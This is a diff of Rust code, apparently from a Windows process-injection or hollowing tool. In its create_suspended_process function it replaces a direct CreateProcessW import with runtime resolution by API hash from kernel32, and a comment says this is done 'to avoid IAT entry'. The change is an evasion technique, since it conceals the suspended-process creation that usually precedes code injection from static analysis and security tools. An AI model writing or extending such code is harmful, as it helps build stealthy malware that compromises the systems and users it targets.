@@ -942,14 +942,35 @@ struct SuspendedProcess {
 unsafe fn create_suspended_process(
     target_path: &[u16],
 ) -> Result<SuspendedProcess, String> {
-    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
+    use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
     use winapi::um::winnt::PROCESS_ALL_ACCESS;
+
+    // Dynamically resolve CreateProcessW from kernel32 to avoid IAT entry.
+    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
+    let cpw_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"CreateProcessW\0"),
+    ).ok_or_else(|| "could not resolve CreateProcessW".to_string())?;
+    type CreateProcessWFn = unsafe extern "system" fn(
+        *mut u16,                              // lpApplicationName
+        *mut u16,                              // lpCommandLine
+        *mut c_void,                           // lpProcessAttributes
+        *mut c_void,                           // lpThreadAttributes
+        i32,                                   // bInheritHandles
+        u32,                                   // dwCreationFlags
+        *mut c_void,                           // lpEnvironment
+        *mut u16,                              // lpCurrentDirectory
+        *mut STARTUPINFOW,                     // lpStartupInfo
+        *mut PROCESS_INFORMATION,              // lpProcessInformation
+    ) -> i32; // BOOL
+    let create_proc_w: CreateProcessWFn = std::mem::transmute(cpw_addr);
 
     let mut startup_info: STARTUPINFOW = std::mem::zeroed();
     startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
     let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();
 
-    let success = CreateProcessW(
+    let success = create_proc_w(
         target_path.as_ptr() as *mut _,
         std::ptr::null_mut(),
         std::ptr::null_mut(),
